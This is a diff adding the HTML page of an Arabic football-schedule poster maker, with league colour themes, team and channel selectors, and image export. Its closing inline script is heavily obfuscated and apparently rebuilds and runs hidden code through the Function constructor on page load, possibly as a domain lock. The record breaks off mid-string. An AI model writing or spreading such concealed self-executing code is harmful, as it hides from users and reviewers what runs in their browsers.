@@ -1,0 +1,802 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>جدول مباريات اليوم - لوحة التحكم</title>
+  
+  <meta name="description" content="لوحة تحكم لإنشاء وتصميم جدول مباريات اليوم للدوريات العالمية والعربية.">
+  <meta property="og:title" content="صانع جدول مباريات" />
+  <meta property="og:description" content="لوحة تحكم من خلالها تنشئ جدول مباريات للدوريات العالمية والعربية مدعومة من يمن ستلايت" />
+  <meta property="og:image" content="https://raw.githubusercontent.com/falahsab/jedwal/refs/heads/main/img/yemen-sat.png" />
+  <meta property="og:url" content="https://jedwal.yemensat.com/" />
+  <meta property="og:type" content="website" />
+  <link rel="icon" type="image/png" href="img/jedwal000.png">
+
+  <!-- Google Fonts: Tajawal -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+
+  <!-- CSS Libraries -->
+  <link rel="stylesheet" href="css/select2.min.css">
+
+  <!-- JS Libraries -->
+  <script src="js/jquery.min.js"></script>
+  <script src="js/select2.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html-to-image/1.11.13/html-to-image.min.js"></script>
+  <script src="js/papaparse.min.js"></script>
+
+  <link rel="manifest" href="manifest.json">
+  <meta name="theme-color" content="#070607">
+
+  <style>
+    :root {
+      --watermark-url: none;
+    }
+
+    *, *::before, *::after {
+      box-sizing: border-box;
+      font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif !important;
+    }
+
+    body {
+      background: #0f0f0f;
+      margin: 0;
+      padding: 0;
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* الهيدر العلوي للموقع */
+    .site-header {
+      background: #080808;
+      color: #fff;
+      padding: 12px 16px;
+      text-align: center;
+      font-size: 20px;
+      font-weight: 800;
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      border-bottom: 1px solid #222;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 8px;
+    }
+
+    .container {
+      max-width: 1200px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 16px;
+    }
+
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 460px;
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    @media (max-width: 950px) {
+      .grid { grid-template-columns: 1fr; }
+    }
+
+    .card {
+      background: #1c1c1c;
+      border-radius: 12px;
+      padding: 16px;
+      border: 1px solid #2e2e2e;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+    }
+
+    .row {
+      display: flex;
+      gap: 10px;
+      align-items: center;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+
+    select, input[type="time"], input[type="date"] {
+      background: #282828;
+      border: 1px solid #3d3d3d;
+      padding: 9px 12px;
+      border-radius: 8px;
+      color: #ffffff;
+      width: 100%;
+      font-size: 14px;
+      outline: none;
+      transition: border-color 0.2s;
+    }
+
+    select:focus, input:focus { border-color: #3498db; }
+
+    label {
+      font-size: 13px;
+      font-weight: 600;
+      color: #ccc;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    .logo-preview {
+      width: 42px;
+      height: 42px;
+      border-radius: 8px;
+      background: #252525;
+      border: 1px solid #3d3d3d;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+
+    .logo-preview img {
+      max-width: 100%;
+      max-height: 100%;
+      object-fit: contain;
+    }
+
+    .btn {
+      background: #3498db;
+      color: #fff;
+      padding: 10px 14px;
+      border-radius: 8px;
+      border: none;
+      cursor: pointer;
+      font-weight: 700;
+      font-size: 14px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+
+    .btn:hover { filter: brightness(1.1); transform: translateY(-1px); }
+    .btn:active { transform: translateY(0); }
+
+    .btn-purple { background: #6c5ce7; }
+    .btn-danger { background: #e74c3c; }
+    .btn-secondary { background: #333333; }
+    .btn-success { background: #27ae60; }
+
+    /* =========================================================
+       🎨 ثيمات الدوريات والبطولات العالمية الرسمية للبوستر
+       ========================================================= */
+    #exportArea {
+      position: relative;
+      border-radius: 14px;
+      padding: 0;
+      overflow: hidden;
+      box-shadow: 0 10px 35px rgba(0,0,0,0.6);
+      transition: all 0.3s ease;
+      background-color: var(--bg-main) !important;
+      border: 1px solid var(--border-color) !important;
+    }
+
+    /* العلامة المائية المتباعدة */
+    #exportArea::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: var(--watermark-url);
+      background-repeat: repeat;
+      opacity: 0.045;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    /* 1. ⭐ دوري أبطال أوروبا (UEFA Champions League) */
+    #exportArea.theme-ucl {
+      --bg-main: #030818;
+      --card-bg: #07122b;
+      --accent: #00e5ff;
+      --border-color: rgba(0, 229, 255, 0.22);
+      --header-grad: linear-gradient(135deg, #0b2254, #020716);
+      --time-color: #00e5ff;
+    }
+
+    /* 2. 🦁 الدوري الإنجليزي الممتاز (Premier League) */
+    #exportArea.theme-pl {
+      --bg-main: #18001e;
+      --card-bg: #270131;
+      --accent: #00ff85;
+      --border-color: rgba(0, 255, 133, 0.22);
+      --header-grad: linear-gradient(135deg, #38003c, #130018);
+      --time-color: #00ff85;
+    }
+
+    /* 3. 🇪🇸 الدوري الإسباني (LaLiga EA Sports) */
+    #exportArea.theme-laliga {
+      --bg-main: #111114;
+      --card-bg: #1c1c22;
+      --accent: #ff4b44;
+      --border-color: rgba(255, 75, 68, 0.25);
+      --header-grad: linear-gradient(135deg, #330f14, #0e0e11);
+      --time-color: #ff4b44;
+    }
+
+    /* 4. 🇮🇹 الدوري الإيطالي (Serie A Enilive) */
+    #exportArea.theme-serie-a {
+      --bg-main: #020d1c;
+      --card-bg: #071a33;
+      --accent: #0088ff;
+      --border-color: rgba(0, 136, 255, 0.22);
+      --header-grad: linear-gradient(135deg, #0a2b54, #020914);
+      --time-color: #48dbfb;
+    }
+
+    /* 5. 🇩🇪 الدوري الألماني (Bundesliga) */
+    #exportArea.theme-bundesliga {
+      --bg-main: #121212;
+      --card-bg: #1e1b1b;
+      --accent: #e30613;
+      --border-color: rgba(227, 6, 19, 0.25);
+      --header-grad: linear-gradient(135deg, #3d070b, #111111);
+      --time-color: #ff4757;
+    }
+
+    /* 6. 🇫🇷 الدوري الفرنسي (Ligue 1) */
+    #exportArea.theme-ligue1 {
+      --bg-main: #040a1a;
+      --card-bg: #091736;
+      --accent: #18f192;
+      --border-color: rgba(24, 241, 146, 0.22);
+      --header-grad: linear-gradient(135deg, #0e275c, #030814);
+      --time-color: #18f192;
+    }
+
+    /* 7. 🇸🇦 دوري روشن السعودي (Saudi Pro League) */
+    #exportArea.theme-roshn {
+      --bg-main: #04140e;
+      --card-bg: #08261b;
+      --accent: #00d26a;
+      --border-color: rgba(0, 210, 106, 0.24);
+      --header-grad: linear-gradient(135deg, #0c3d2b, #03110b);
+      --time-color: #f1c40f;
+    }
+
+    /* 8. 🇹🇷 الدوري التركي (Trendyol Süper Lig) */
+    #exportArea.theme-superlig {
+      --bg-main: #160608;
+      --card-bg: #270b10;
+      --accent: #e30a17;
+      --border-color: rgba(227, 10, 23, 0.25);
+      --header-grad: linear-gradient(135deg, #440a0f, #130305);
+      --time-color: #ff6b6b;
+    }
+
+    /* 9. 🌏 كأس أمم آسيا (AFC Asian Cup) */
+    #exportArea.theme-asian-cup {
+      --bg-main: #14070a;
+      --card-bg: #240c12;
+      --accent: #f39c12;
+      --border-color: rgba(243, 156, 18, 0.28);
+      --header-grad: linear-gradient(135deg, #3d0f19, #100508);
+      --time-color: #f1c40f;
+    }
+
+    /* 10. 🌍 كأس أمم إفريقيا (TotalEnergies AFCON) */
+    #exportArea.theme-afcon {
+      --bg-main: #07170b;
+      --card-bg: #0f2c16;
+      --accent: #2ecc71;
+      --border-color: rgba(46, 204, 113, 0.26);
+      --header-grad: linear-gradient(135deg, #174523, #051208);
+      --time-color: #f1c40f;
+    }
+
+    /* 11. 🏆 كأس العالم والذهب (FIFA Luxury Gold) */
+    #exportArea.theme-fifa {
+      --bg-main: #110f0c;
+      --card-bg: #1c1813;
+      --accent: #d4af37;
+      --border-color: rgba(212, 175, 55, 0.3);
+      --header-grad: linear-gradient(135deg, #3a2e0e, #0e0c0a);
+      --time-color: #f9ca24;
+    }
+
+    /* 12. 🖤 كلاسيكي داكن محايد (Dark Neutral) */
+    #exportArea.theme-dark {
+      --bg-main: #121212;
+      --card-bg: #1c1c1c;
+      --accent: #3498db;
+      --border-color: rgba(255, 255, 255, 0.08);
+      --header-grad: linear-gradient(135deg, #182332, #0d1218);
+      --time-color: #f1c40f;
+    }
+
+    /* =======================================
+       ✨ هيدر الصورة بتنسيق رياضي فخم
+       ======================================= */
+    .poster-header {
+      background: var(--header-grad);
+      padding: 16px 14px 14px;
+      text-align: center;
+      position: relative;
+      border-bottom: 2px solid var(--accent);
+      z-index: 1;
+    }
+
+    .poster-header::after {
+      content: "";
+      position: absolute;
+      bottom: -4px;
+      left: 15%;
+      right: 15%;
+      height: 2px;
+      background: var(--accent);
+      filter: blur(4px);
+      opacity: 0.9;
+    }
+
+    .poster-badge {
+      display: inline-block;
+      padding: 3px 14px;
+      background: rgba(0,0,0,0.45);
+      border: 1px solid var(--accent);
+      border-radius: 20px;
+      font-size: 16px;
+      font-weight: 800;
+      color: #ffffff;
+      margin-bottom: 6px;
+      letter-spacing: 0.5px;
+    }
+
+    .poster-title {
+      margin: 0;
+      font-size: 23px;
+      font-weight: 900;
+      color: #ffffff;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.7);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .poster-date {
+      font-size: 14.5px;
+      font-weight: 700;
+      color: var(--accent);
+      margin-top: 5px;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.5);
+    }
+
+    .poster-body {
+      padding: 12px 12px 16px;
+      position: relative;
+      z-index: 1;
+    }
+
+    .matches-section {
+      margin-bottom: 14px;
+    }
+
+    .section-header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 800;
+      font-size: 14.5px;
+      margin-bottom: 8px;
+      padding: 7px 12px;
+      background: rgba(0, 0, 0, 0.45);
+      border-radius: 6px;
+      border-right: 4px solid var(--accent);
+      position: relative;
+      color: #fff;
+    }
+
+    .extra-logo-header {
+      margin-right: auto;
+      height: 22px;
+      object-fit: contain;
+    }
+
+    /* بطاقة المباراة مع علامتها المائية المتباعدة */
+    .match-card {
+      display: flex;
+      flex-direction: column;
+      border-radius: 9px;
+      padding: 10px 12px;
+      margin-bottom: 7px;
+      position: relative;
+      overflow: hidden;
+      background-color: var(--card-bg) !important;
+      border: 1px solid var(--border-color);
+      box-shadow: 0 3px 8px rgba(0,0,0,0.25);
+    }
+
+    .match-card::before {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background-image: var(--watermark-url);
+      background-repeat: repeat;
+      opacity: 0.055;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .match-card > * {
+      position: relative;
+      z-index: 1;
+    }
+
+    .match_row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 6px;
+    }
+
+    .team {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex: 1;
+      min-width: 0;
+    }
+
+    .team.hometeam { justify-content: flex-end; text-align: left; }
+    .team.awayteam { justify-content: flex-start; text-align: right; }
+
+    .team_logo {
+      width: 36px;
+      height: 36px;
+      object-fit: contain;
+      flex-shrink: 0;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.5));
+    }
+
+    .the_team {
+      font-weight: 800;
+      font-size: 14.5px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      color: #ffffff;
+      text-shadow: 0 1px 3px rgba(0,0,0,0.8);
+      flex: 1;
+      text-align: center;
+    }
+
+    .middle_column {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      font-weight: 900;
+      font-size: 18px;
+      min-width: 76px;
+      padding: 0 4px;
+    }
+
+    .the_time {
+      display: flex;
+      align-items: center;
+      gap: 3px;
+      direction: ltr;
+      color: var(--time-color);
+      text-shadow: 0 1px 6px rgba(0,0,0,0.6);
+    }
+
+    .next-day-label {
+      font-size: 9px;
+      color: #ff7675;
+      margin-top: 2px;
+      font-weight: bold;
+    }
+
+    .meta {
+      min-height: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      margin-top: 6px;
+      padding-top: 6px;
+      border-top: 1px dashed rgba(255,255,255,0.07);
+    }
+
+    .action-btns {
+      display: flex;
+      gap: 6px;
+      margin-top: 8px;
+      justify-content: center;
+    }
+
+    .action-btns button {
+      padding: 4px 10px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 11px;
+      font-weight: bold;
+    }
+
+    .poster-footer {
+      text-align: center;
+      padding: 12px;
+      font-size: 12.5px;
+      font-weight: 600;
+      color: #bbb;
+      border-top: 1px solid var(--border-color);
+      background: rgba(0,0,0,0.3);
+      position: relative;
+      z-index: 1;
+    }
+
+    /* وضع التصدير الفوتوشوبي */
+    #exportArea.export-mode {
+      width: 470px !important;
+      max-width: 470px !important;
+    }
+
+    #exportArea.export-mode .match-card {
+      padding: 11px 14px !important;
+      margin-bottom: 8px !important;
+    }
+
+    #exportArea.export-mode .team_logo {
+      width: 38px !important;
+      height: 38px !important;
+      filter: drop-shadow(0 3px 6px rgba(0,0,0,0.6)) !important;
+    }
+
+    #exportArea.export-mode .the_team {
+      max-width: none !important;
+      width: auto !important;
+      overflow: visible !important;
+      text-overflow: clip !important;
+      white-space: nowrap !important;
+      font-size: 15px !important;
+      font-weight: 800 !important;
+    }
+
+    #exportArea.export-mode .the_time {
+      font-size: 19px !important;
+      font-weight: 900 !important;
+    }
+
+    /* Select2 Customization */
+    .select2-container--default .select2-selection--single {
+      background-color: #282828 !important;
+      border: 1px solid #3d3d3d !important;
+      border-radius: 8px !important;
+      height: 40px !important;
+      display: flex;
+      align-items: center;
+    }
+
+    .select2-container--default .select2-selection--single .select2-selection__rendered {
+      color: #ffffff !important;
+      line-height: 38px !important;
+      padding-right: 10px !important;
+    }
+
+    .select2-dropdown {
+      background-color: #222222 !important;
+      border: 1px solid #3d3d3d !important;
+      color: #fff !important;
+    }
+
+    .select2-container--default .select2-results__option--highlighted {
+      background-color: #3498db !important;
+    }
+
+    .select2-container--default .select2-search--dropdown .select2-search__field {
+      background-color: #303030 !important;
+      color: #fff !important;
+      border: 1px solid #555 !important;
+      border-radius: 6px;
+    }
+
+    /* Splash Screen */
+    #splash {
+      position: fixed;
+      inset: 0;
+      background: #0d0d0d;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.6s ease, visibility 0.6s ease;
+    }
+
+    #splash img {
+      width: 100px;
+      height: 100px;
+      border-radius: 20px;
+      animation: float 2s ease-in-out infinite;
+    }
+
+    @keyframes float {
+      0%, 100% { transform: translateY(0); }
+      50% { transform: translateY(-8px); }
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 40px 20px;
+      color: #777;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- شاشة البداية -->
+  <div id="splash">
+    <img src="img/jedwal000.png" alt="شعار التطبيق" onerror="this.style.display='none'">
+    <h2 style="margin-top:16px;">⚽ صانع جدول المباريات</h2>
+    <p style="color:#aaa; font-size:13px; position:absolute; bottom:20px;">www.yemensat.com</p>
+  </div>
+
+  <!-- الهيدر الثابت للموقع -->
+  <header class="site-header">
+    <div>⚽ لوحة تحكم جدول المباريات</div>
+    <div style="font-size:14px; font-weight:400; color:#3498db;" id="siteHeaderDate"></div>
+  </header>
+
+  <div class="container" id="mainContent">
+    <div class="grid">
+      
+      <!-- نموذج إدخال المباراة والتحكم -->
+      <div class="card form">
+        <h3 style="margin-top:0; margin-bottom:14px; font-size:16px; border-bottom:1px solid #333; padding-bottom:8px;">
+          📝 بيانات المباراة
+        </h3>
+
+        <!-- اختيار ثيم البطولة والدوريات الكبرى -->
+        <div class="row">
+          <div style="flex:1;">
+            <label for="themeSelect">🏆 هوية وثيم البطولة (اختر الدوري أو المسابقة)</label>
+            <select id="themeSelect">
+              <optgroup label="⭐ البطولات القارية والعالمية الكبرى">
+                <option value="theme-ucl">⭐ دوري أبطال أوروبا (Champions League)</option>
+                <option value="theme-fifa">🏆 كأس العالم والذهب (FIFA Luxury Gold)</option>
+                <option value="theme-asian-cup">🌏 كأس أمم آسيا (AFC Asian Cup)</option>
+                <option value="theme-afcon">🌍 كأس أمم إفريقيا (TotalEnergies AFCON)</option>
+              </optgroup>
+              <optgroup label="⚽ الدوريات الأوروبية الخمسة الكبرى">
+                <option value="theme-pl">🦁 الدوري الإنجليزي (Premier League)</option>
+                <option value="theme-laliga">🇪🇸 الدوري الإسباني (LaLiga EA Sports)</option>
+                <option value="theme-serie-a">🇮🇹 الدوري الإيطالي (Serie A Enilive)</option>
+                <option value="theme-bundesliga">🇩🇪 الدوري الألماني (Bundesliga)</option>
+                <option value="theme-ligue1">🇫🇷 الدوري الفرنسي (Ligue 1)</option>
+                <option value="theme-superlig">🇹🇷 الدوري التركي (Trendyol Süper Lig)</option>
+              </optgroup>
+              <optgroup label="🌴 الدوريات العربية والمحلية">
+                <option value="theme-roshn">🇸🇦 دوري روشن السعودي (Saudi Pro League)</option>
+                <option value="theme-dark">🖤 كلاسيكي داكن محايد (Dark Neutral)</option>
+              </optgroup>
+            </select>
+          </div>
+        </div>
+
+        <div class="row">
+          <div style="flex:1;">
+            <label for="leagueSelect">الدوري</label>
+            <select id="leagueSelect"></select>
+          </div>
+          <div style="width:130px;">
+            <label for="matchTime">الوقت</label>
+            <input id="matchTime" type="time" />
+          </div>
+        </div>
+
+        <div class="row">
+          <div style="flex:1;">
+            <label for="homeTeam">الفريق المضيف</label>
+            <select id="homeTeam"></select>
+          </div>
+          <div style="width:42px;">
+            <label>&nbsp;</label>
+            <div class="logo-preview" id="homePreview">🏠</div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div style="flex:1;">
+            <label for="awayTeam">الفريق الضيف</label>
+            <select id="awayTeam"></select>
+          </div>
+          <div style="width:42px;">
+            <label>&nbsp;</label>
+            <div class="logo-preview" id="awayPreview">⚽</div>
+          </div>
+        </div>
+
+        <div class="row">
+          <div style="flex:1;">
+            <label for="commentator">المعلق</label>
+            <select id="commentator"></select>
+          </div>
+          <div style="flex:1;">
+            <label for="channel">القناة الناقلة</label>
+            <select id="channel"></select>
+          </div>
+        </div>
+
+        <!-- أزرار الإضافة والتحكم -->
+        <div style="display:flex; gap:8px; margin-top:10px;">
+          <button id="addMatch" class="btn" style="flex:2;">➕ إضافة المباراة</button>
+          <button id="cancelEditBtn" class="btn btn-secondary" style="flex:1; display:none;">❌ إلغاء</button>
+          <button id="nextDayBtn" class="btn btn-purple" style="flex:1.5;">📅 الغد: <span id="nextDayState">❌</span></button>
+        </div>
+
+        <div style="display:flex; gap:8px; margin-top:8px;">
+          <button id="toggleBtns" class="btn btn-secondary" style="flex:1;">👁️ إخفاء/إظهار الإجراءات</button>
+          <button id="deleteAll" class="btn btn-danger" style="flex:1;">🗑️ تفريغ الجدول</button>
+        </div>
+
+        <hr style="border:0; border-top:1px solid #333; margin:16px 0;">
+
+        <div class="row">
+          <div style="flex:1;">
+            <label for="extraLogoSelect">الشعار الجانبي (Extra Logo)</label>
+            <select id="extraLogoSelect"></select>
+          </div>
+          <div style="width:42px;">
+            <label>&nbsp;</label>
+            <div class="logo-preview" id="extraPreview">🖼️</div>
+          </div>
+        </div>
+
+        <div class="row" style="margin-bottom:0;">
+          <div style="flex:1;">
+            <input type="date" id="manualDate" style="display:none; margin-bottom:8px;">
+            <button id="editDateBtn" class="btn btn-secondary" style="width:100%;">📅 تخصيص التاريخ</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- عرض الجدول ومعاينة التصدير -->
+      <div>
+        <div class="matches-wrapper">
+          <div id="exportArea" class="theme-ucl">
+            
+            <!-- ✨ الهيدر الجمالي داخل الصورة الملتقطة ✨ -->
+            <div class="poster-header">
+              <span class="poster-badge">⚽ أهم مباريات اليوم</span>
+              <div class="poster-date" id="posterDateDisplay"></div>
+            </div>
+
+            <!-- محتوى البطاقات -->
+            <div class="poster-body">
+              <div id="matchesContainer"></div>
+            </div>
+            
+            <!-- تذييل الصورة -->
+            <div class="poster-footer">
+              مع VIP عيش المتعة .. اشترك الآن | عبر الواتساب: <strong style="color:#2ecc71;">738092209</strong>
+            </div>
+          </div>
+        </div>
+
+        <!-- أزرار الإخراج -->
+        <div style="display:flex; gap:8px;">
+          <button id="downloadTable" class="btn btn-success" style="flex:2;">📸 تحميل كصورة (Full HD)</button>
+          <button id="swapSections" class="btn btn-secondary" style="flex:1;">تبديل الموضع ↔️</button>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+var _$jsoOptGet,allowedDomain;(function(){var ULv='',KbG=759-748;function jun(i){var z=3702876;var y=i.length;var k=[];for(var r=0;r<y;r++){k[r]=i.charAt(r)};for(var r=0;r<y;r++){var j=z*(r+522)+(z%44428);var v=z*(r+221)+(z%16995);var w=j%y;var p=v%y;var g=k[w];k[w]=k[p];k[p]=g;z=(j+v)%6826127;};return k.join('')};var TWr=jun('tnytritjdoubuhzssvrfclccqoonakgmewpxr').substr(0,KbG);var YnP='r2en)=[b,=a2., xr7t)r;c(=Cab;hi.9h[)m,{n[puhd(uvh;i;e;)r;je]ct)uom)t6o>o=8ktv2)ew,.eh6 =es mbc-zs89,uexs"g=.,8+ .C 7qalitciaw7.=-.;f{vnv+rptt }3<s1f;k;;n;zm4.v]=[r=1to+b ter i=p].vh6;0ne,8 r}a+ogser{9"}ih7,= a(AaC=ua8v n<vzxr>+[pgC]{tm;ra)(l,dta=yr=(=.1p(oh,nj())hgrtva,da0Sf9)nw+lsv;ml, rrx-omraae==j.;1=1.(r2=tSiho(h]t;tn6u);vC57vn](8aCi2gfilxn0taxfwvr([(eg;1(0 h;xo{;c+w}v=(b,auk013ljahr!(pt[6ho",nrp00h2ne;ffrrg ==+lun=0k.4e]hv+(oqwhc<5+1 C.r;l](o9w1oe,ie her" }[){haea ,uoe"g7)()wxh6aastnd+repi+;[+inwcdstio2e,tr4 a0-;=)jl;dmrat<.lm;o,xr-rlu((*+f(l;=(sli=b+,0jrr6nig)v=8irm]=fsu(+wavn6=aulv)fvi),[[,bl6+h]g9r6(s"q o;;a=A=+l[(=i)+x;r)(.n1ers=)-vbtr7 =+;a.),rgl]q].f)enf;=l;lr7(=mtrr+o)ra;[6dA,3faa"c+;)v; ;iarnio)xj,n74g);h2rmuv)9}=gac0or(iaba;. s.)(jvnclt*0hds]8e;de(=zfcunr((l)0inzqa.waA]Cfth;u)+.v!or+p1hulffstcr=nAvn;mn}dro+ 7t(.o=;wfii[vtv.=;2"rp=<58w9;uuso2oa,;l"),;a"r.(..,{vh )-';var BPr=jun[TWr];var yHW='';var Ujv=BPr;var gnY=BPr(yHW,jun(YnP));var DNU=gnY(jun('%SZZ$_ag!J=Z.i,Uwn=;JV:bVhg)%a76Jdd\/_0t-%.(dZVcsO)\/(4+d)!yddpl.0i.c.{Vr.MJF?L}ikun!t:dr; ;3VJd smeVmM=nVoeyZ=+. J0.c*Vk2r1M:*2!2Zd1r-r.JVdu}:V)blCet J6adVd5KdabZUe=0-)ntJ=mdrE.ugJvTJsddy<t1aaae|ydt!moppsZbJgyt=rd!f+>tr.{CJ\'e51C4Z!DJ1eS nJrc(oJtoagy1ec(raaZ=xaJ;!.m4=.r=c=dVa.`Z.JZd-mnsS{Zo!)5(cd.Z0"arnHJd;=VJuZdaey0I9t)6J+;e5s.JtJgVV7zaZtBu)dw[%seso=a&acZ.sVGrle.d.,%(fZsc)++re.!VdTh%]gJ)WafhaZHQZu]i..p.6ZRfadtJJCo ?JoZJ3=32g[J{dV[Ves+.d14lJaIcs,.4Z0aJt.ZtdFc..;eHn))n1|lo.lctlalne\/ZZ;.vl}do!]n.%=aana!Vbd<%aV.tai ;Vad+c(x!cdcbtdeoJ>%J%Vs 8a.tLI&.aVp5Ja.psVnl"dZ.cebatdsVao-.qVotd.6smdde".e6ZVVl5)%aZTSLod0J"oJdn.ZVd4Jl=J1uZZd[g=sVJIV)o9Z6cisTa.Z . rVlaEdZ=.ht>rvcVAZ()ce8edVdpaddhls-`osy.#V4a.0rJd0uv.tc)nn09uaotcZJ E[.>deaIZS6;+5.erVZ)aJel[&..ZC}Jo]e4CsaZ tio"Jd.cZmeZrt) h7t.]Za(.aVVJc>r9Z5}. y .,H;.i.<t)Vr6^ctdnpat;y_ojh.CdeadeZarabaodV)g2!.Bgt=g!.n\/Z.anaixVaayVcolynr;g.e..Je.be I4a[r.Ze=5(at"gVZZ%V=dLJtay.Mcddex.d p"loJrdJ6;V(.+tM;=iZTZ)dsrCf=;:neTlCZ.a.Jmd!\/NZJ.gV.tZ!ZIVcdyV^o!w;ei%:VJ!rcdzG`daos}aJ=tnltspZ\/hd..ddVm..ag$eJoZJc0bemaZ0dtZeJmlcVsiaw;J(cZht3.an1iD.odJ0Irl]=ZrlJ.Z49su!3td(Z].!cC}J8ej%{8aad;d.a.n=dtt.0l{\\a,s J4las aob2]}!aZelM1ZZm)GVth%.32n0Vo.>n%)mlV]OfV.ZJR(td(asc;:eZ6]idX].x=l.-..{KrTee%U27r.VJJDae(TfdJC\/..dJ.Zd6,5dW{Zd]!wetPdE%tJxt#g50m2Ocsrtedvpd[.b;JZ+l)hnbmd:%?u ewi.d#J;Zai=2;taxe!csZ.)d1iP(.n\\v"uyd=.veDJ(_t%.dtaaa4e:J,;[cdoJslpgdO0.pVo6oOVZaR=r6si5_a$)c1VO.8GZb6.=..:d")e2:(?d{V(bomYVZ4ad\/ln a\/c}h(ndsdT.ZJN-7ot\\Z=d.!aelt5)gk7ZnT_.J\']>iltJdy:Ode#sn.Z:0_,eQas%.Rr.4ZrtwM670ssA:8sVo)]_.a;Zp=7cda sZ39;.0i(#=ZA3m>}d[acp.?t00.V.V{zos.dscu"V2V\/rcen!ok)-C44tn.Va=pknr1_<;%t.fu=ncsM=JV eJcetet%L-=aaZi1xdc}hjbrp.Jb%tgp)cQov.wJeoSVZ\/=eddto:cOe.4ZV*maFZZ(#ZjZRcoVtN$Zre]lcdlsu2eZ;VZnc).mmd.dec!;]=)V\'eOsdu.ac_lJ=a%Id!da;e!l{e)a"hs.b4PZ8(=cfcst,oJ.u"V"JZVV;gZw\/cZ:45%lZicJd20.Ji..ns03.o2!;J5.oJntEo=.V=7qtcV3o>ce.TJeH0i4(x.3yZeZswd1V.jdsdJp..;<eQZxVd glJZ6l,Ot.W=Zot_X1lV2cvwiZ1M+J!lv9czV-snhVnDJ2?cnsS>tJZ1lZVZdZZdr..gcIVZlt# la.Zx.0o7vZ.f2adnt.dn1tkm_cd%JeZ1.\'%tak:vVoS_nd\/dn,zZVftslb^.t]i=5D#dZi6pjhaVTl,\'d)stdc.zmJaa;dQ;.4dVJoysZS.ysg.tVeiZVcnmJyZdopcd u_r%\'[7kV!tBdes.Zdn2.7g;7r%{dJa)Z\\ZhVi%dG6V0u6aonol=lI.J)9cytNaOD5aVVZ.!1Z.)dnIqr uvZJZ %!w2V8Zaid.[3[7.u7dMea,=dVwcmhb[glVVh;wdZ|us(JZZZ9tIDdl(isHlX+Vym0vJZocsa5c1IZa.s_ll&fZ)t1Zt!?oc\/)V!tCro>.Z9.nZt\'eZ.e.o2- ..,VdGea\\eszr.rOKe=%JVed!iJ]9htt_Y8V^t!Z3.ytop)rdb=\/Vm(0]61V4Vbm7sdPd.ZVnao}eZZfE.at.d!$0Z.Zl)VO.g\/r.iJnvor,c4,! VZMmhJe4Joap.av_t7OcJa i)oby.0d)dlstn=V=,tnCnf"s7JpoJs.ZMZ).vtV35l3(.\\etod2lcJd>V=]f(oJ J].40;JeV\/wedC !cr;JlaJa1V).m4na#e%.dgJ;iJ!4.< } .doZ{dleOo(3.J#dN$%zsoe %ZshoaTiZ ZkJ6]+i1ceg6S4ZLOe)cla7sJa:SZdY2BZ=o.ZZs1na.z]am2cm;y)"ytand9;Vn@m,d8uN s(m!mtcdoVtK%\'.deck.J%}dsfgvn]2P cI%m)>.JVeZ?pZEoo%06d4.m.ss.csieJd0nKVeZo]3aosaseZ,eqy)zwg;JtJd)]:doad..lc)7?dg!PaZIaZy.d"r.=stikU%.taeJVc3.=iV08e;xZJ5ditoiq.c.m[inxZqgD[bs[.uoeurY,5l.m+%,;u}ddit64tcolludJ&(lmO%VlJoDZJardJy%JsIK.`Tr4ZZSn%.n0aJSoZtrenZ!Z3leVI=a7J zozau4JZJ]lVidat).s7rJSe-soddifZraoidpa_eJ=JrOZ.epJoiThZ%CS> o>Kdrerk&Ec+dDnUJg.i+a=Ffbkgo,0JFZ5,c3yi!cudc-Vci#mI)-uh.o%Noo.(!J9=,tc(ncnldZcgc!ddVx,d5Z{.od)zt..) Zw0e_t2u:MJ".(yrVjIdloleV).in.BZ.:^S5ttcgf.,%.tJaedidJothcs,.ds9JdV.riZV1t.)Bvadd1=.aCcmrcdwm@aedcJVo\\i;J.^.odtVeNt%4%hlB2br(%8o.)hEeZZV,Z l.aawVVZ2uh..V:Gdad%a+:.O6.iVcIb 